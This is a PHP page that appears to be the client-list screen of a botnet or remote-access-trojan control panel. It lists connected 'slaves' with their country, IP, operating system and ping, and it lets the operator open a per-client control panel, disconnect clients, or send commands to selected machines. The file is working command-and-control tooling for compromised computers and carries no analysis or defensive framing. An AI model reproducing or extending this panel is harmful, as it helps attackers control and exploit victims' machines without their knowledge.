<?php
xdebug_disable();

require_once "request.php";

$request = new Request();
$sock = $request->createSocket();

$request->redirectError();

if (isset($_POST['id'])) {
	$selectedid = $_POST['id'];
	$checked = $_POST['checked'];
	
	$request->write(PACKET_SELECT);
	$request->write($selectedid);
	$request->write($checked);
}

if (isset($_GET['id'])) {
	
	if (isset($_GET['action'])) {
		
		$action = $_GET['action'];
		
		if ($action == "remove") {
			$request->write(PACKET_REMOVE_OFFLINE);
			$request->write($_GET['id']);
		}
	}
}

if (isset($_POST['select'])) {
	if (isset($_POST['disconnect'])) {
		$request->write(PACKET_DISCONNECT_CLIENT);
		$request->write(count($_POST['select']));
		foreach ($_POST['select'] as $slave) {
			$request->write($slave);
		}
	}
	
	if (isset($_POST['command'])) {
		$s;
		foreach ($_POST['select'] as $slave) {
			$s .= $slave . ",";
		}
		header("Location: commands.php?clients=" . $s);
		exit();
	}

} else {

}

$slaves = $request->getSlaves();
$offline = $request->getOfflineClients();
$request->disconnect();

$slaves = array_merge($slaves, $offline);

$count = count($slaves);

require_once "layout/header.php";

?>

<script type="text/javascript">
    // setInterval("reload_table();", 1000); 
    function reload_table(){
      $('#refresh').load(location.href + ' #table');
    }
</script>

<script>
$(document).ready(function() {
    $('#selectall').click(function(event) {
        if (this.checked) { 
            $('.box').each(function() {
                this.checked = true;          
            });
        } else {
            $('.box').each(function() { 
                this.checked = false;            
            });         
        }
    });

    $('#selectall').click(function(event) {
    	$.post("clients.php",
    			{
        	    	id: "all",
        	    	checked: this.checked,
        	    },
        	    function(data, status) {
        		   	// alert("Data: " + data + "\nStatus: " + status);
        	 	}
        	);  
    });

    $('.box').click(function(event) {
    	$.post("clients.php",
			{
    	    	id: this.value,
    	    	checked: this.checked,
    	    },
    	    function(data, status) {
    		   	// alert("Data: " + data + "\nStatus: " + status);
    	 	}
    	);   
    });
});
</script>


<section class="wrapper scrollable">
	<?php require_once "layout/menubar.php"; ?>
	<br>
	<div class="col-md-12">
		<div class="panel panel-default panel-block">
			<div class="list-group">
				<div id="refresh" class="list-group-item">
					<div id="table" class="form-group">
						<form method="POST">

							<h4 class="section-title">Client List (<?php echo $count; ?>)</h4>

							<div class="form-group" align=right>
								<button type="submit" name="reload" class="btn btn-success">
									<i class="icon-times"></i> Reload
								</button>
								<button type="submit" name="disconnect" class="btn btn-default">
									<i class="icon-times"></i> Disconnect
								</button>
								<button type="submit" name="command" class="btn btn-default">
									<i class="icon-external-link"></i> Command
								</button>

							</div>

							<table class="table table-bordered table-striped">
								<thead class="">
									<tr>
										<th>ID</th>
										<th>Country</th>
										<th>Identifier</th>
										<th>IP</th>
										<th>Operating System</th>
										<th>Version</th>
										<th>Ping</th>
										<th></th>
										<th><input type="checkbox" class="box" id="selectall"></th>
									</tr>
								</thead>
								<tbody>
	
					<?php
					
					function printTableData($s) {
						echo "<td>" . $s . "</td>\n";
					}
					
					$page = isset($_GET ['page']) ? $_GET ['page'] : "all";
					
					if ($page == 0) {
						$page = "all";
					}
					
					$displayed = 0;
					
					if ($page == "all") {
						$start = 0;
						$max = $count;
					} else {
						$page --;
						
						$max = 10;
						$start = $page * $max;
						
						if ($page < 0) {
							$page = 0;
						}
					}
					
					for($i = $start; $i < $start + $max; $i ++) {
						if (!isset($slaves[$i])) {
							break;
						}
						$slave = $slaves[$i];
						
						$displayed++;
						
						$checked = $slave->isSelected() === "true" ? "checked" : "";
						
						echo "<tr>\n";
						echo printTableData($slave->getStringId());
						echo printTableData($slave->getDisplayCountry());
						echo printTableData($slave->getIdentifier());
						echo printTableData($slave->getIP());
						echo printTableData($slave->getOperatingSystem());
						echo printTableData($slave->getVersion());
						echo printTableData($slave->getPing());

						if (!$slave->isOffline()) {
							echo printTableData("<a href='client.php?id=" . $slave->getUniqueId() . "'>Control Panel</a>");								
						} else {
							echo printTableData("<a href='clients.php?id=" . $slave->getUniqueId() . "&action=remove'>Remove</a>");								
						}
						
						echo printTableData("<input class='box' id='update' type='checkbox' name='select[$i]' value='" . $slave->getUniqueId() . "' " . $checked . ">");
						echo "</tr>\n";
					
					}
					?>
	
					</tbody>
							</table>
						</form>
						<div class="form-group" align="right">
							<div>

								<ul class="pagination pagination-demo">
						
									<?php
									if ($page != "all") {
										$page ++;
									}
									echo '<li><a href="clients.php?page=' . ($page - 1) . '">&laquo;</a></li>';
									echo '<li><a href="clients.php?page=' . ($page) . '">' . ($page) . '</a></li>';
									echo '<li><a href="clients.php?page=' . ($page + 1) . '">&raquo;</a></li>';
									?>
									
								</ul>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</section>

<?php

require_once "layout/footer.php";

?>